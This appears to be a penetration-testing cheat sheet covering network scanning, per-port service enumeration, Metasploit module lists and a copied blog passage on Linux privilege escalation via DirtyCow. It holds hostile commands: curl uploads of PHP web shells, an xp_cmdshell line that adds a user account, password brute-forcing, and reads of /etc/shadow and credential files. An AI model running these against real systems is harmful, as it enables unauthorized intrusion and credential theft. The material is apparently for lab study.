<h2>POINT</h2>
-scanning
-Enumertion
-Exploit
-Priviglage Escaltion
-Post Enumertion
-Proof of content

<h1>information gathering - IP range </h1>
~~
IP range discover 
netdiscover -r 192.168.1.1/24
nbtscan  					--------------------------------------------------  additional information
~~

<h1>Scanning</h1>
sudo masscan --router-mac ba:62:4d:d8:39:32 -p0-65535 --max-rate 300 --interactive 10.11.1.5

masscan -p 1-65535 10.11.1.223 -e tap0 --rate 1000 --router-ip 10.11.0.1
masscan -p1-65535,U:1-65535 10.10.10.75 --rate=1000 -e tun0

masscan -p1-65535 10.10.10.127 --rate=1000 -e tap0  10.11.10.1> ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p​$ports​ 10.10.10.127

nmap --script=http-vuln*  -sT -p-  -sV -A -sC   192.168.1.126 -oN   filename

nmap  -sT -p-  -sV -A -sC   10.11.1.5

-sT									-->   scanning for TCP

-p-									--> scan all port 

-sV									--> version find 

-A                                                                   --> all NSE accgravice scripts use (like OS detection , kernel version )

-sC   								--> common scripts use 

-oN									-->  create a file  sotre all output 

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nmap -Pn --disable-arp-ping -p 22,80,111,139,443,1024 -sT -sV -A 10.200.1.3          ---------------------------------------- Scan service


http://www.0daysecurity.com/penetration-testing/enumeration.html
 
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#enumeration--attacking-network-services


<h1>Enumeration</h1>


enum4linux -a [ip]  								------------------ check  services  version     (PORT 139 )

locate nse | grep script. 								--------------------  list of NES scripts Linux

nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1   --------------------- Scan using a specific NSE script

nmap -sV --script=smb* 192.168.1.1				      -----------------------Scan with a set of scripts 	


dirb http://10.11.1.31/ /usr/share/wordlists/dirb/common.txt	     ----------------------- PORT 80 ,PORT 443   check  directory  scaning 

gobuster -e -u http://10.11.1.31/ -w /usr/share/wordlists/dirb/common.txt		------------------> tool enum	
gobuster -e -u http://10.11.1.116/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -t 100
uniscan -u http://10.11.1.39/ -qweds
nikto -h http://10.11.1.39

hydra -L users -P 10_million_password_list_top_1000.txt -t 4 Target ip ssh -vv    ------------> ssh login using 				

PORT<NSE<searchspolit<google portservice <site list <forum<metasploit

##  == IP DISCOVERY ==
netdiscover -r 10.0.2.0/24
nmap -sP 10.195.0.0/16 // ping discovery scan
  
## NMAP Service and OS Detection
nmap -sT -A -sV --version-intensity 6 -p- 192.168.31.149

nmap -sTU -A 192.168.1.1   // Os and services for TCP and UDP
nmap -sV 192.168.1.1    // service detection
nmap -sV --version-intensity 5 192.168.1.1 // service detection agressive. 0 is less agressive
xprobe2 -v -p tcp:80:open IP

## == PORT SCANNING ==
nmap -sS is the default scanning mode // TCP SYN SCAN
nmap -iL list-of-ips.txt    //scan the targets from the text file
nmap 192.168.1.1 /24   //scan a subnet
nmap -F 192.168.1.1   //scan most common 100 ports. Fast.
nmap -p 100-200 192.168.1.1   // scan a range of ports
nmap -p- 192.168.1.1    // scan all ports
nmap -Pn -F 192.168.1.1   //scan selected ports and ignore discovery

## Other NMAP parameters
-oN outputfile.txt    // save as txt
--script=ssl-heartbleed // checks for heartbleed

    == Unicorn scans ==  // port scanner
us -H -msf -Iv 192.168.56.101 -p 1-65535  ## TCP connect SYN scan
us -H -mU -Iv 192.168.56.101 -p 1-65535   ## UDP scan

-H = resolve hostnames 
-m = scan mode (sf - tcp, U - udp)
-Iv - verbose

## Locate NSE scripts
locate nse | grep script

  == DOMAIN info: ==
whois domain.com
whois x.x.x.x
http://netcraft.com/       //domain and hosting information
https://archive.org/web/   //Wayback machine

   == HTTP finderprinting ==
wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt

== WEB DIRECTORY ENUMERATION ==
## searches for known files, like robots.txt, .htaccess, .htpasswd, etc
nmap --script http-enum 192.168.10.55  

## grab robots.txt and filter it
curl -s http://192.168.56.102/robots.txt | grep Disallow | sed 's/Disallow: //'

## check which page is accessible to us (200 OK)
for i in $(curl -s http://192.168.56.102/robots.txt | grep Disallow | sed 's/Disallow: //') ; \
do RESULT=$(curl -s -I http://192.168.56.102"$i" | grep "200 OK") ; echo -e "$i $RESULT\r" ; done

## brute force a directory with custom wordlists
nmap -p80 --script=http-brute --script-args 'http-brute.path=/printers/, userdb=/usr/share/wordlists/metasploit/http_default_users.txt, passdb=/usr/share/wordlists/rockyou.txt' 192.168.x.x   

## HTTP brute force a protected directory. Auditing against http basic, digest and ntlm authentication.
## This script uses the unpwdb and brute libraries to perform password guessing
nmap -p80 --script http-brute --script-args http-brute.path=/printers/ 192.168.x.x

## Discovers hostnames that resolve to the target's IP address by querying the online database at www.bfk.de
nmap --script -http-enum --script-args http-enum.basepath='pub/' 192.168.x.x

## Files and folders in a web root directory.
## /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
dirb http://192.168.x.x

## WEB page headers
nmap --script=http-headers 192.168.1.0/24

## WEb page headers
root@kali:~# nc -nvv 192.168.31.149 80
(UNKNOWN) [192.168.31.149] 80 (http) open
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 06 Mar 2018 11:47:38 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Sun, 12 Nov 2017 16:12:12 GMT
ETag: "512-55dcb6aaa2f50"

## WEB page titles from a subnet of IPs
nmap --script http-title -sV -p 80 192.168.1.0/24  

## Grab banners
root@kali:~# nc -n -vv 192.168.13.230 80 
HEAD / HTTP/1.1      // or 1.0
HEAD   ### <address>Apache/2.2.22 (Ubuntu) Server at xyz.com Port 80</address>
GET /index

## HTTP methods. Inspecting the response of the OPTIONS verb on the /test directory.
curl -v -X OPTIONS http://192.168.230.153/test/

#get page with different user agent
curl -H "User-Agent:Mozilla/4.0" http://192.168.31.146:8080/phptax/ | head -n2

# create a .php file in /test directory with curl. 
curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php

#connect to a UDP port 
nc -u localhost 161

##== WEB APPLICATION SCANNERS ==
## scan Joomla
joomscan -u http://192.168.230.150:8081

## scan Wordpress
wpscan domain.com

## enumerate Wordpress users
wpscan --url http://10.10.10.2 --enumerate u

## bruteforce Wordpress user's password
wpscan --url 10.10.10.2/secret --wordlist /usr/share/wordlists/dirb/big.txt --threads 2

## scan a web appliction with nikto
nikto -C all -h http://IP

## scan web apps
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
skipfish -o 202 http://192.168.1.202/wordpress   ## Using the given directory for output (-o 202) , scan the web application URL 
 (http://192.168.1.202/wordpress):

## LFI, RFI, RCE
uniscan -u http://192.168.44.134:10000/ -qweds

### Test for LFI
# Harvest links from a page (to test for LFI)
fimap -H -u "http://192.168.56.129" -d 3 -w /tmp/urllist
#test for LFI using harvested links
fimap -m -l /tmp/urllist


##  == DNS enumeration ==
dnsrecon -r 192.168.13.200-192.168.13.254 -n 192.168.13.220   //reverse lookup. dns server is -n
dnsrecon -d acme.local -D /usr/share/golismero/wordlist/dns/dnsrecon.txt -t brt  //bruteforce the acme.local domain for domains and subdomains
dnsrecon -a -d thinc.local -n 192.168.13.220  ## trying zone transfer. -n is the DNS server
nmap -sU -p 22 --script=*dns* 192.168.1.200

## find DNS (A) records by trying a list of common sub-domains from a wordlist.
nmap -p 80 --script dns-brute.nse domain.com
python dnscan.py -d domain.com -w ./subdomains-10000.txt

  == SSH server info ==
nmap --script=ssh2-enum-algos,ssh-hostkey,sshv1.nse 192.168.13.234 

  == WINDOWS ==
# search for files
C:\> dir /s /b network-secret.txt

dir /q calc.exe //display ownership
dir /a:d calc.exe // /a is mandatory
  d Directories
  h Hidden files
  s System files

# Find all listening ports and filer by string
netstat -aon | find /i "listening" | findstr 127.0.0.1

#find out the used  open ports in Windows
netstat -an | find /i "Listening"
netstat -an | find /i "Established"

#enumerate Windows services
tasklist /svc

# Find all listening ports and show the process and PID too
protocol, PID, port, service name, service, state of the connection. Use "| findstr" to filter.
netstat -abno

# Queries the configuration information for a specified service.
C:\WINDOWS\system32>sc qc alg
sc qc alg
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: alg
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\alg.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Application Layer Gateway Service  
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService  
----------


#list security policy
net accounts

#list users
net users
WMIC /NODE: "BOB" COMPUTERSYSTEM GET USERNAME   ##needs admin  

#Display the username/domain you are currently logged in with
C:\Users\Administrator> echo %USERDOMAIN%\%USERNAME%
testdomain\Administrator

#list privileges via cmd
cacls *
cacls "C:\Program Files" /T | findstr Users
cacls *.exe | findstr "IUSR_BOB:F"  ## lists permissions of *.exe and searches for the user and his full permissions string "IUSR_BOB:F". 

#search for passwords in the Windows Registry
reg query "HKLM\Software\Microsoft\WindowsNT\Currentversion\Winlogon"
reg query "HKLM\System\CurrentControlSet\Services\SNMP"

#Display the hosts file
type C:\Windows\system32\drivers\etc\hosts
type c:\Winnt\system32\drivers\etc\hosts   //Windows 2000

#display ARP table
arp -a

#display routing table
routeprint

#find out if Windows is 32 or 64 bits from cmd
wmic os get osarchitecture

#find out Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#get general system info from cmd
systeminfo

#get username 
echo %username%

#display existing users
net users

#show firewall state. From WinXP upwards
netsh firewall show state

#firewall config
netsh firewall show config


  == LINUX ==
## Use LinuxEnum.sh script
./LinEnum.sh

# search for files
find / -name "network-secret.txt"
locate "network-secret.txt"

# Search for specific strings inside a file
strings ./*.txt | grep password
grep -l -i pass /var/log/*.log 2>/dev/null
find / -maxdepth 10 -name *.conf -type f | grep -Hn pass; 2>/dev/null // searches for the string 'password' and output the line number
find / -maxdepth 10 -name *etc* -type f | grep -Hn pass; 2>/dev/null  //as above, but in *etc*

  ## ls commands
find / -perm -4000 -type f 2>/dev/null      //Find SUID files
find / -uid 0 -perm -4000 -type f 2>/dev/null   //Find SUID files owned by root
find / -perm -2000 -type f 2>/dev/null      // Find files with GUID bit set
find / -perm -2 -type f 2>/dev/null         //Find world-writable files
find / -perm -2 -type d 2>/dev/null         //Find word-writable directories
find /home –name .rhosts -print 2>/dev/null    //Find rhost config files
ls -ahlR /root/      //list files recursively

  ## Service information
ps aux | grep root    // View services running as root
cat /etc/inetd.conf     // List services managed by inetd
cat /etc/xinetd.conf    // As above for xinetd


## Find out what Linux interpreter you are using
ps -p $$

## see $PATH in Linux
echo $PATH

## chanage $PATH. As in add something to the PATH
export PATH=/some/path1:/some/path2  //redefine $PATH bash variable



  == SQL ==
sqlmap -u "http://192.168.56.129/?page=login" -a --level=5
hexorbase  ##MySql, Oracle, PostgreSQL, SQLlite, MS-Sql browser

  == SMB NETBIOS== 
enum4linux target
nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254
nbtscan -r 192.168.11.0/24
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
smbmap -u "" -p "" -d MYGROUP -H 10.11.1.22



## NetBIOS NullSession enumeration
## This  feature  exists  to  allow  unauthenticated  machines  to  obtain  browse  lists  from  other  
## Microsoft   servers. Enum4linux is a wrapper  built on top of smbclient,rpcclient, net and nmblookup
./enum4linux -a 192.168.1.1

## NMAP SMB scripts
nmap --script smb-* --script-args=unsafe=1 192.168.10.55 

##  ls -lh /usr/share/nmap/scripts/smb*	
smb-brute.nse
smb-enum-domains.nse
smb-enum-groups.nse
smb-enum-processes.nse
smb-enum-sessions.nse
smb-enum-shares.nse
smb-enum-users.nse
smb-flood.nse
smb-ls.nse
smb-mbenum.nse
smb-os-discovery.nse
smb-print-text.nse
smb-psexec.nse
smb-security-mode.nse
smb-server-stats.nse
smb-system-info.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-regsvc-dos.nse
smbv2-enabled.nse

#mount SMB (Netbios/Windows) shares in Linux
smbclient -L \\WIN7\ -I 192.168.13.218
smbclient -L \\WIN7\ADMIN$  -I 192.168.13.218
smbclient -L \\WIN7\C$ -I 192.168.13.218
smbclient -L \\WIN7\IPC$ -I 192.168.13.218
smbclient '\\192.168.13.236\some-share' -o user=root,pass=root,workgroup=BOB

#mount MSB shares in Windows (via cmd)
net use X: \\<server>\<sharename> /USER:<domain>\<username> <password> /PERSISTENT:YES

    == SNMP ==
nmap -sU -p 161 --script=*snmp* 192.168.1.200
xprobe2 -v -p udp:161:open 192.168.1.200

msf >  use auxiliary/scanner/snmp/snmp_login
msf > use auxiliary/scanner/snmp/snmp_enum

snmp-check 192.168.1.2 -c public
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
onesixtyone -c /usr/share/wordlists/dirb/small.txt 192.168.1.200  // find communities with bruteforce
for i in $(cat /usr/share/wordlists/metasploit/unix_users.txt);do snmpwalk -v 1 -c $i 192.168.1.200;done| grep -e "Timeout" // find communities with bruteforce


## == PHP ==
Read PHP source code with php://filter
http://192.168.56.129/?page=upload   // original page
http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
curl http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
-- The result needs to be decoded from Base64

## Port

21/tcp 

nmap --script ftp-vuln-cve2010-4221 -p 21 <host>
nmap --script ftp-brute -p 21 <host>
nmap --script ftp-vsftpd-backdoor -p 21 <host>
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1 


https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands
https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/

22/TCP

nmap --script ssh2-enum-algos target

nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \ --script-args ssh-brute.timeout=4s <target>

 nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" <target>
 nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <target> 
 nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}' <target> 
 nc -nv 10.11.1.71 22


25/TCP

nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 <host>
nmap --script unusual-port <ip>
nmap -sV --script=smtp-strangeport <target>
use auxiliary/scanner/smtp/smtp_version


53/TCP
nmap --script=broadcast-dns-service-discovery www.hackingarticles.in
nmap -T4 -p 53 --script dns-brute www.hackingarticles.in
dnsenum --noreverse -o mydomain.xml hackingarticles.in
dnsrecon -d hackingarticles.in

139/TCP

nmap --script smb-vuln-ms06-025.nse -p139 <host>
nmap --script smb-enum-users.nse -p139<host>
nmap --script smb-vuln* host
nmap --script smb-* --script-args=unsafe=1 192.168.10.55 
nbtscan -r 10.11.1.128
nmblookup -A host 	
smbmap -H 192.168.1.102
smbclient -L 192.168.1.102
rpcclient -U "" -N 192.168.1.102
use scanner/smb/smb_version


143/TCP
nmap -p 143,993 --script imap-brute <host>
nmap -p 22,443 --script rsa-vuln-roca <target>


3306/tcp  open  mysql       
nmap --script=mysql-enum <target>
https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum

32768/tcp open  status      1 (RPC #100024)


80/http
•  dirbuster (GUI)
•  dirb http://10.0.0.1/ 
•  nikto –h 10.0.0.1 

POP3 - Port 110
use auxiliary/scanner/pop3/pop3_version
use auxiliary/scanner/pop3/pop3_login
nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx
telnet 10.10.10.51 110

nc 10.11.1.72 4555 (jamses server)


135/msrpc

use auxiliary/scanner/dcerpc/endpoint_mapper



=====================================================================================

Enumeration Cheat Sheet for Windows Targets


 
•  Port 21
• Port 22
• Port 25
• Port 80
• Port 443
• Port 135
• Port 139/445
• Port 161/162 - UDP 
• Port 1433
• Port 1521
• Port 3306
• Port 3389
   
   Port 21  Enumeration commands for FTP service;  
  nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn 192.168.1.10   
  Metasploit Modules for FTP service;   
•  auxiliary/scanner/ftp/anonymous
• auxiliary/scanner/ftp/ftp_login
• auxiliary/scanner/ftp/ftp_version
• auxiliary/scanner/ftp/konica_ftp_traversal
 
     Port 22  Nmap command for SSH service;  
  nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10 nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10  nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10   
  Metasploit Modules for SSH service;  
•  auxiliary/scanner/ssh/fortinet_backdoor
• auxiliary/scanner/ssh/juniper_backdoor
• auxiliary/scanner/ssh/ssh_enumusers
• auxiliary/scanner/ssh/ssh_identify_pubkeys
• auxiliary/scanner/ssh/ssh_login
• auxiliary/scanner/ssh/ssh_login_pubkey
• auxiliary/scanner/ssh/ssh_version
 
     Port 25  Nmap command for SMTP service;  
  nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn 192.168.1.10   
  Metasploit Modules for SMTP service;  
•  auxiliary/scanner/smtp/smtp_enum
• auxiliary/scanner/smtp/smtp_ntlm_domain
• auxiliary/scanner/smtp/smtp_relay
• auxiliary/scanner/smtp/smtp_version 
 
      Port 80  Enumration commands for HTTP service;  
nikto -h http://192.168.1.10/ 
curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php 
sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql 
cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt 
medusa -h 192.168.1.10 -u admin -P wordlist.txt -M http -m DIR:/admin -T 10 
nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10 
  
  You can find more information about SQL Injection Types and Uploading Files with SQL Injection from here.

     Port 443  In addition to the HTTP Enumeration commands, you can use the following SSL Scan command for HTTPs Service Enumeration;

sslscan https://192.168.1.10/ 

 Port 135  Enumeration commands for Microsoft RPC service;  
nmap -n -v -sV -Pn -p 135 --script=msrpc-enum 192.168.1.10  
  Metasploit Exploit Module for Microsoft RPC service;


exploit/windows/dcerpc/ms05_017_msmq
 
   Port 139/445  Enumeration commands for Microsoft SMB service;  

enum4linux -a 192.168.1.10 
rpcclient -U "" 192.168.1.10 >srvinfo >enumdomusers >getdompwinfo 
smbclient -L 192.168.1.10 
smbclient \\192.168.1.10\ipc$ -U administrator 
smbclient //192.168.1.10/ipc$ -U administrator 
smbclient //192.168.1.10/admin$ -U administrator 
nmblookup  -A target ip 
nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
smbmap -H [ip/hostname]


 	Metasploit Modules for Microsoft SMB service;

•  auxiliary/scanner/smb/psexec_loggedin_users
• auxiliary/scanner/smb/smb_enumshares
• auxiliary/scanner/smb/smb_enumusers
• auxiliary/scanner/smb/smb_enumusers_domain
• auxiliary/scanner/smb/smb_login
• auxiliary/scanner/smb/smb_lookupsid
• auxiliary/scanner/smb/smb_ms17_010
• auxiliary/scanner/smb/smb_version
 
  You can find about more information about Dumping NTLM Hashes from here.  You can find about more information about Passing The NTLM Hashes from here.  

Port 161/162 - UDP  Enumeration commands for SNMP service;  
nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10 onesixtyone -c communities.txt 192.168.1.10 snmp-check -t 192.168.1.10 -c public snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE] hydra -P passwords.txt -v 192.168.1.10 snmp #Communities.txt public private community #SNMP MIB Trees 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports 
  Metasploit Modules for SNMP service;


•  auxiliary/scanner/snmp/snmp_enum
• auxiliary/scanner/snmp/snmp_enum_hp_laserjet
• auxiliary/scanner/snmp/snmp_enumshares
• auxiliary/scanner/snmp/snmp_enumusers
• auxiliary/scanner/snmp/snmp_login
 
   Port 1433  Enumeration commands for MsSQL service;  
nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10 nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password 192.168.1.10 nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user lifeoverpentest MySecretPassword123 /add" 192.168.1.10 sqsh -S 192.168.1.10 -U sa 
  Metasploit Modules for MsSQL service;


•  auxiliary/scanner/mssql/mssql_login
• auxiliary/admin/mssql/mssql_exec
• auxiliary/admin/mssql/mssql_enum
 
  You can find more information about Gain Access to Servers with MsSQL and Metasploit from here.  
   Port 1521  Enumeration commands for Oracle DB service;  
nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt 192.168.1.10 nmap -n -v -sV -Pn -p 1521 --script=oracle-sid-brute 192.168.1.10 tnscmd10g version -h 192.168.1.10 tnscmd10g status -h 192.168.1.10 
  Metasploit Modules for Oracle DB service;


•  auxiliary/scanner/oracle/emc_sid
• auxiliary/scanner/oracle/oracle_login 
• auxiliary/scanner/oracle/sid_brute
• auxiliary/scanner/oracle/sid_enum
• auxiliary/scanner/oracle/tnslsnr_version
• auxiliary/scanner/oracle/tnspoison_checker
 
 
  Port 3306  Enumeration commands for MySQL service;  
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10 mysql --host=192.168.1.10 -u root -p 
  Metasploit Modules for MySQL service;


•  auxiliary/scanner/mysql/mysql_authbypass_hashdump
• auxiliary/scanner/mysql/mysql_login
• auxiliary/scanner/mysql/mysql_schemadump
• auxiliary/scanner/mysql/mysql_version
• auxiliary/scanner/mysql/mysql_writable_dirs
 
 Port 3389  Enumeration commands for Remote Desktop service;  
  ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1 rdesktop 192.168.1.10 
  Metasploit Modules for Remote Desktop service;


• auxiliary/scanner/rdp/ms12_020_check
• auxiliary/scanner/rdp/rdp_scanner 

<h1>Exploit</h1>
expoit DB
seachsploit 
metaasploit
google 

<h1>privilege escalation</h1>
~~~
Windows:
 date /t
 time/t 
hostname 
whoami (or echo %username%)
 ipconfig 
dir 
type proof.txt 
type network-secret.txt 
systeminfo 
net users 
net localgroup 
administrators 
ipconfig -all 
route print 
arp -a 
netstat -ano 
tasklist /svc 
net start 
net share 
net use 


Linux:
date 
whoami 
id 
hostname 
/sbin/ifconfig 
pwd 
ls -l 
cat proof.txt 
cat network-secret.txt 
cat /etc/issue 
uname -a 
cat /etc/passwd 
cat /etc/group 
cat /etc/shadow 
cat /etc/sudoers 
ls -alh /var/mail/ 
ls -ahlR /root/ 
ls -ahlR /home/ 
who w last 
/sbin/ifconfig -a 
cat /etc/network/interfaces (or cat /etc/sysconfig/network) 
arp -e /sbin/route -nee 
ps aux 
ps -ef 
cat /etc/services
~~~

<h1>Privilege escalation</h1>

What is Privilege escalation?
Most computer systems are designed for use with multiple users. Privileges mean what a user is permitted to do. Common privileges include viewing and editing files, or modifying system files. Privilege escalation means a user receives privileges they are not entitled to. These privileges can be used to delete files, view private information, or install unwanted programs such as viruses. It usually occurs when a system has a bug that allows security to be bypassed or, alternatively, has flawed design assumptions about how it will be used.

Privilege escalation is the act of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. The result is that an application with more privileges than intended by the application developer or system administrator can perform unauthorized actions.

While organizations are statistically likely to have more Windows clients, Linux privilege escalation attacks are significant threats to account for when considering an organization’s information security posture. Consider that an organization’s most critical infrastructure, such as web servers, databases, firewalls, etc. are very likely running a Linux operating system. Compromises to these critical devices have the potential to severely disrupt an organization’s operations, if not destroy them entirely. Furthermore, Internet of Things (IoT) and embedded systems are becoming ubiquitous in the workplace, thereby increasing the number of potential targets for malicious hackers. Given the prevalence of Linux devices in the workplace, it is of paramount importance that organizations harden and secure these devices.

Objective
In this blog, we will talk in detail as what security issues could lead to a successful privilege escalation attack on any Linux based systems. We would also discuss as how an attacker can use the possible known techniques to successfully elevate his privileges on a remote host and how we can protect our systems from any such attack. At the end, examples would be demonstrated as how we achieved privilege escalation on different Linux systems under different conditions.

This blog is particularly aimed at beginners to help them understand the fundamentals of Linux privilege escalation with examples. It is not a cheatsheet for enumeration using Linux commands. Privilege escalation is all about proper enumeration. There are multiple ways to perform the same tasks that I have shown in the examples. If you want a Linux Enumeration command cheatsheet, then you should definitely look at g0tmi1k’s post here – https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Permission model in Linux


Linux has inherited from UNIX the concept of ownerships and permissions for files. File permissions are one way the system protects against malicious tampering. On a UNIX web server, every single file and folder stored on the hard drive has a set of permissions associated with it, which says who is allowed to do what with the file.



In the above two screenshots we can see that the file ‘docker-compose.yml’ only has read access by the owner which is ‘root’. If any other user tries to read this file, he cannot read it. We can see the permission denied error, when I tried reading the file when I am not a superuser.

We will not go into permission model details here as it is another big topic. It is just to understand the basic fact that a user can not access (read/write/execute) files which he is not permitted to access. However, the superuser(root) can access all the files which are present on the system. In order to change any important configuration or perform any further attack, first we need to get root access on any Linux based system. 

Why do we need to perform privilege escalation?
Read/Write any sensitive file
Persist easily between reboots
Insert a permanent backdoor
Techniques used for Privilege escalation
We assume that now we have shell on the remote system. Depending upon how we got there, we probably might not have ‘root’ privilege. The below mentioned techniques can be used to get ‘root’ access on the system.

1. Kernel exploits
Kernel exploits are programs that leverage kernel vulnerabilities in order to execute arbitrary code with elevated permissions. Successful kernel exploits typically give attackers super user access to target systems in the form of a root command prompt. In many cases, escalating to root on a Linux system is as simple as downloading a kernel exploit to the target file system, compiling the exploit, and then executing it.

Assuming that we can run code as an unprivileged user, this is the generic workflow of a kernel exploit.

1. Trick the kernel into running our payload in kernel mode 
2. Manipulate kernel data, e.g. process privileges 
3. Launch a shell with new privileges Get root!

Consider that for a kernel exploit attack to succeed, an adversary requires four conditions:

1. A vulnerable kernel 
2. A matching exploit 
3. The ability to transfer the exploit onto the target 
4. The ability to execute the exploit on the target

The easiest way to defend against kernel exploits is to keep the kernel patched and updated. In the absence of patches, administrators can strongly influence the ability to transfer and execute the exploit on the target. Given these considerations, kernel exploit attacks are no longer viable if an administrator can prevent the introduction and/or execution of the exploit onto the Linux file system. Therefore, administrators should focus on restricting or removing programs that enable file transfers, such as FTP, TFTP, SCP, wget, and curl. When these programs are required, their use should be limited to specific users, directories, applications (such as SCP), and specific IP addresses or domains.

The infamous DirtyCow exploit – Linux Kernel <= 3.19.0-73.8

A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system. It was one of the most serious privilege escalation vulnerability ever discovered and it affected almost all the major Linux distros.

Exploiting a vulnerable machine via dirtycow

$ whoami – tells us the current user is john (non-root user)
$ uname -a – gives us the kernel version which we know is vulnerable to dirtycow
> downloaded the dirtycow exploit from here – https://www.exploit-db.com/exploits/40839/
> Compiled and executed it. It replaces the ‘root’ user with a new user ‘rash’ by editing the /etc/passwd file.
$ su rash – It changes the current logged in user to ‘rash’ which is root.



You can check out other variants of dirtycow exploits here – https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

There are a lot of different local privilege escalation exploits publicly available for different Kernel and OS. Whether you can get root access on a Linux host using a kernel exploit depends upon whether the kernel is vulnerable or not. Kali Linux has a local copy of exploit-db exploits which make it easier to search for local root exploits. Though I would not suggest to completely rely on this database while searching for Linux Kernel exploits.

$ searchsploit Linux Kernel 2.6.24 – It shows us all the available exploits for a particular Linux kernel which are already there in kali Linux.



Why you should avoid running any local privilege escalation exploit at first place?
Though, It feels very tempting to just run a exploit and get root access, but you should always keep this as your last option.

1. The remote host might crash as many of the root exploits publicly available are not very stable.
